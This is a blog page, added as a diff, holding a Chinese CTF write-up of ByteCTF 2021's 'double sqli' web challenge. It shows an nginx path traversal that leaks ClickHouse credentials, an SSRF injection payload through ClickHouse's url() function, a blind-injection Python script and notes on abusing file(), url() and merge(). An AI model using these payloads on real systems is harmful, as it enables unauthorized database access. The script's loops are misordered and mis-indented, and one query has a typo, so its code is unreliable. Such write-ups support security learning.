@@ -1,0 +1,342 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="double sqli解题思路利用nginx配置不当导致目录穿越获取文件 123456# http:&#x2F;&#x2F;39.105.175.150:30001&#x2F;files..&#x2F;# &#x2F;var&#x2F;lib&#x2F;clickhouse&#x2F;access&#x2F;3349ea06-b1c1-514f-e1e9-c8d6e8080f89.sqlATTACH USER user_01 IDENTIFIED WITH plaintext_pass">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Bytectf2021WEB">
+<meta property="og:url" content="https://tefuir72.github.io/2021/10/18/2021101821/index.html">
+<meta property="og:site_name" content="TeFuir&#39;Blog">
+<meta property="og:description" content="double sqli解题思路利用nginx配置不当导致目录穿越获取文件 123456# http:&#x2F;&#x2F;39.105.175.150:30001&#x2F;files..&#x2F;# &#x2F;var&#x2F;lib&#x2F;clickhouse&#x2F;access&#x2F;3349ea06-b1c1-514f-e1e9-c8d6e8080f89.sqlATTACH USER user_01 IDENTIFIED WITH plaintext_pass">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2021-10-18T13:57:07.000Z">
+<meta property="article:modified_time" content="2021-10-19T12:42:11.345Z">
+<meta property="article:author" content="Te Fuir">
+<meta property="article:tag" content="ctf">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Bytectf2021WEB</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" "Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/links/">links</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post " href="/2021/10/18/2021101815/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post " href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://tefuir72.github.io/2021/10/18/2021101821/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://tefuir72.github.io/2021/10/18/2021101821/&text=Bytectf2021WEB"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://tefuir72.github.io/2021/10/18/2021101821/&title=Bytectf2021WEB"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://tefuir72.github.io/2021/10/18/2021101821/&is_video=false&description=Bytectf2021WEB"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Bytectf2021WEB&body=Check out this article: https://tefuir72.github.io/2021/10/18/2021101821/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://tefuir72.github.io/2021/10/18/2021101821/&title=Bytectf2021WEB"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://tefuir72.github.io/2021/10/18/2021101821/&title=Bytectf2021WEB"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://tefuir72.github.io/2021/10/18/2021101821/&title=Bytectf2021WEB"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://tefuir72.github.io/2021/10/18/2021101821/&title=Bytectf2021WEB"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://tefuir72.github.io/2021/10/18/2021101821/&name=Bytectf2021WEB&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://tefuir72.github.io/2021/10/18/2021101821/&t=Bytectf2021WEB"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#double-sqli"><span class="toc-number">1.</span> <span class="toc-text">double sqli</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="toc-number">1.1.</span> <span class="toc-text">解题思路</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8B%93%E5%B1%95%E7%9F%A5%E8%AF%86"><span class="toc-number">1.2.</span> <span class="toc-text">拓展知识</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Bytectf2021WEB
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Te Fuir</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2021-10-18T13:57:07.000Z" itemprop="datePublished">2021-10-18</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/web/">web</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/ctf/" rel="tag">ctf</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h3 id="double-sqli"><a href="#double-sqli" class="headerlink" title="double sqli"></a>double sqli</h3><h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h4><p>利用nginx配置不当导致目录穿越获取文件</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># http:<span class="operator">/</span><span class="operator">/</span><span class="number">39.105</span><span class="number">.175</span><span class="number">.150</span>:<span class="number">30001</span><span class="operator">/</span>files..<span class="operator">/</span></span><br><span class="line"># <span class="operator">/</span>var<span class="operator">/</span>lib<span class="operator">/</span>clickhouse<span class="operator">/</span>access<span class="operator">/</span><span class="number">3349</span>ea06<span class="operator">-</span>b1c1<span class="number">-514</span>f<span class="operator">-</span>e1e9<span class="operator">-</span>c8d6e8080f89.sql</span><br><span class="line"></span><br><span class="line">ATTACH <span class="keyword">USER</span> user_01 IDENTIFIED <span class="keyword">WITH</span> plaintext_password <span class="keyword">BY</span> <span class="string">&#x27;e3b0c44298fc1c149afb&#x27;</span>;</span><br><span class="line">ATTACH <span class="keyword">GRANT</span> <span class="keyword">SELECT</span> <span class="keyword">ON</span> ctf.<span class="operator">*</span> <span class="keyword">TO</span> user_01;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>可知用户 <code>user_01</code> 密码  <code>e3b0c44298fc1c149afb</code></p>
+<p>利用<code>clickhouse</code>的<code>url()</code>函数<code>ssrf</code>登录<code>user_01</code>进行<code>clickhouse</code>查询flag</p>
+<p>最后构造payload</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://39.105.175.150:30001/?id=<span class="keyword">if</span>((SELECT%20*%20from%20url(%27http://localhost:8123/?user=user_01%26password=e3b0c44298fc1c149afb%26query=select%250aflag%250afrom%250actf.flag%27,CSV,%27column1%20String,%20column2%20UInt32%27)),1,0)</span><br><span class="line"><span class="comment"># http://39.105.175.150:30001/?id=if((SELECT * from url(&#x27;http://localhost:8123/?user=user_01&amp;password=e3b0c44298fc1c149afb&amp;query=select%0aflag%0afrom%0actf.flag&#x27;,CSV,&#x27;column1 String, column2 UInt32&#x27;)),1,0)</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="拓展知识"><a href="#拓展知识" class="headerlink" title="拓展知识"></a>拓展知识</h4><blockquote>
+<p>Clickhouse 是一个高性能且开源的数据库管理系统，主要用于在线分析处理 (OLAP) 业务。它采用列式存储结构，可使用 SQL  语句实时生成数据分析报告，另外它还支持索引，分布式查询以及近似计算等特性，凭借其优异的表现，ClickHouse 在各大互联网公司均有广泛地应用</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># clickhouse基础用法</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># clickhouse 与 mysql 用法类似</span></span><br><span class="line"><span class="comment"># mysql里面有information_schema，clickhouse里面有system库</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># clickhouse常用查询语句</span></span><br><span class="line">select versionnn() <span class="comment"># 查版本</span></span><br><span class="line">select user() <span class="comment"># 查当前用户</span></span><br><span class="line">select * from system.databases <span class="comment"># 查询库名</span></span><br><span class="line">select * from system.tables <span class="comment"># 查询表名</span></span><br><span class="line">select * from system.columns <span class="comment"># 查询列名</span></span><br><span class="line">select * from ctf.flag <span class="comment"># 查询内容</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 常用函数</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># file() 从文件创建表</span></span><br><span class="line"><span class="comment"># 有权限的话可能造成任意文件读取</span></span><br><span class="line">SELECT * FROM file(<span class="string">&#x27;test.csv&#x27;</span>, <span class="string">&#x27;CSV&#x27;</span>, <span class="string">&#x27;column1 UInt32, column2 UInt32, column3 UInt32&#x27;</span>) LIMIT 2;</span><br><span class="line"></span><br><span class="line"><span class="comment"># url() url 函数从 URL 创建一个具有给定 format 和 structure 的表</span></span><br><span class="line"><span class="comment"># 可能造成ssrf</span></span><br><span class="line"><span class="comment"># url(URL, format, structure)</span></span><br><span class="line"><span class="comment"># URL — HTTP或HTTPS服务器地址，它可以接受 GET 或 POST 请求 (对应于 SELECT 或 INSERT 查询)。类型: String。</span></span><br><span class="line"><span class="comment"># format — 数据格式。类型: String。</span></span><br><span class="line"><span class="comment"># structure — 以 &#x27;UserID UInt64, Name String&#x27; 格式的表结构。确定列名和类型。 类型: String。</span></span><br><span class="line"><span class="comment"># 从HTTP服务器获取的包含 String 和 UInt32 类型的列，以CSV格式返回</span></span><br><span class="line">select * from url(<span class="string">&#x27;http://host:port/path&#x27;</span>, CSV, <span class="string">&#x27;column1 String, column2 UInt32&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># merge() 创建一个临时Merge表</span></span><br><span class="line"><span class="comment"># 从 ctf 库匹配 &#x27;flag&#x27; 表并执行查询（有权限的话）</span></span><br><span class="line">select * from merge(ctf, <span class="string">&#x27;flag&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>可利用脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># clickhouse盲注脚本</span></span><br><span class="line"><span class="keyword">import</span> requests   </span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">cou = <span class="number">0</span></span><br><span class="line">d = <span class="string">&#x27;&#x27;</span></span><br><span class="line">k = [<span class="built_in">str</span>(_) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>)] + [<span class="built_in">str</span>(<span class="built_in">chr</span>(_)).upper() <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">97</span>,<span class="number">103</span>)]</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> k:</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">250</span>):</span><br><span class="line">       <span class="comment"># 利用hex()提升脚本速度</span></span><br><span class="line">       payload = <span class="string">&quot;http://39.105.175.150:30001/?id=if(substr(hex(toString((SELECT * FROM system.tables WHERE name = &#x27;flag&#x27;))),%s,1)=&#x27;%s&#x27;,1,0)&quot;</span> %(i,c)</span><br><span class="line">       <span class="comment">#payload = &quot;http://39.105.175.150:30001/?id=if(substr(hex(toString((select(version())))),%s,1)=&#x27;%s&#x27;,1,0)&quot; %(i,c)# 21.3.2.5</span></span><br><span class="line">       res = requests.get(url=payload)</span><br><span class="line">       <span class="keyword">if</span> <span class="string">&#x27;ByteCTF&#x27;</span> <span class="keyword">in</span> res.text:      </span><br><span class="line">            d += c</span><br><span class="line">            cou += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> cou == <span class="number">2</span>:</span><br><span class="line">                flag += <span class="built_in">chr</span>(<span class="built_in">int</span>(d,<span class="number">16</span>))</span><br><span class="line">                d = <span class="string">&#x27;&#x27;</span></span><br><span class="line">                cou = <span class="number">0</span></span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">if</span> c == <span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="built_in">ord</span>(<span class="string">&#x27;)&#x27;</span>))):</span><br><span class="line">                exit(<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>clickhouse的http客户端</strong></p>
+<blockquote>
+<p>具体可看<a target="_blank" rel="noopener" href="https://clickhouse.com/docs/zh/interfaces/http/">https://clickhouse.com/docs/zh/interfaces/http/</a></p>
+</blockquote>
+<p>默认情况下，<code>clickhouse-server</code>会在<code>8123</code>端口上监控HTTP请求</p>
+<p>可以利用这个端口执行查询语句</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 利用</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送了一个未携带任何参数的GET /请求，将返回响应码200和OK字符</span></span><br><span class="line"><span class="comment"># 可用来判断服务是否开启</span></span><br><span class="line">$ curl <span class="string">&#x27;http://localhost:8123/&#x27;</span></span><br><span class="line">Ok.</span><br><span class="line"></span><br><span class="line"><span class="comment"># 默认情况下，在服务器设置中注册的数据库被用作默认数据库即default库</span></span><br><span class="line"><span class="comment"># 也可以指定数据库</span></span><br><span class="line">$ curl <span class="string">&#x27;http://localhost:8123/?database=system&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 密码认证(三种)</span></span><br><span class="line">$ curl <span class="string">&#x27;http://localhost:8123/?user=user&amp;password=password&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询语句 可以使用GET、POST方法</span></span><br><span class="line"><span class="comment"># 注意 空格需要url编码，可以用再次编码的%0a代替</span></span><br><span class="line">curl <span class="string">&#x27;http://localhost:8123/?query=SELECT%20*%20FROM%20ctf.flag&#x27;</span></span><br><span class="line"><span class="comment"># select * from ctf.flag</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload</span></span><br><span class="line">url(<span class="string">&#x27;http://localhost:8123/?user=user_01&amp;password=e3b0c44298fc1c149afb&amp;query=select%0aflag%0afrom%0actf.flag&#x27;</span>,CSV,<span class="string">&#x27;column1 String, column2 UInt32&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>参考</p>
+<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1400100">https://cloud.tencent.com/developer/article/1400100</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.deteact.com/yandex-clickhouse-injection/">https://blog.deteact.com/yandex-clickhouse-injection/</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.alexanderliu.top/posts/clickhouse-user-guide.html">https://blog.alexanderliu.top/posts/clickhouse-user-guide.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/lineuman/article/details/118768632">https://blog.csdn.net/lineuman/article/details/118768632</a></p>
+</blockquote>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/links/">links</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#double-sqli"><span class="toc-number">1.</span> <span class="toc-text">double sqli</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="toc-number">1.1.</span> <span class="toc-text">解题思路</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8B%93%E5%B1%95%E7%9F%A5%E8%AF%86"><span class="toc-number">1.2.</span> <span class="toc-text">拓展知识</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://tefuir72.github.io/2021/10/18/2021101821/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://tefuir72.github.io/2021/10/18/2021101821/&text=Bytectf2021WEB"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://tefuir72.github.io/2021/10/18/2021101821/&title=Bytectf2021WEB"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://tefuir72.github.io/2021/10/18/2021101821/&is_video=false&description=Bytectf2021WEB"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Bytectf2021WEB&body=Check out this article: https://tefuir72.github.io/2021/10/18/2021101821/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://tefuir72.github.io/2021/10/18/2021101821/&title=Bytectf2021WEB"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://tefuir72.github.io/2021/10/18/2021101821/&title=Bytectf2021WEB"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://tefuir72.github.io/2021/10/18/2021101821/&title=Bytectf2021WEB"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://tefuir72.github.io/2021/10/18/2021101821/&title=Bytectf2021WEB"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://tefuir72.github.io/2021/10/18/2021101821/&name=Bytectf2021WEB&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://tefuir72.github.io/2021/10/18/2021101821/&t=Bytectf2021WEB"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021
+    Te Fuir
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/links/">links</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+
+    </div>
+    <!-- styles -->
+
+
+ 
+  <link
+    rel="preload"
+    href="/lib/font-awesome/css/all.min.css"
+    as="style"
+    onload="this.onload=null;this.rel='stylesheet'"
+  />
+  <noscript
+    ><link
+      rel="stylesheet"
+      href="/lib/font-awesome/css/all.min.css"
+  /></noscript>
+
+
+    <!-- jquery -->
+ 
+  
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+
+
+
+<!-- clipboard -->
+
+   
+    
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
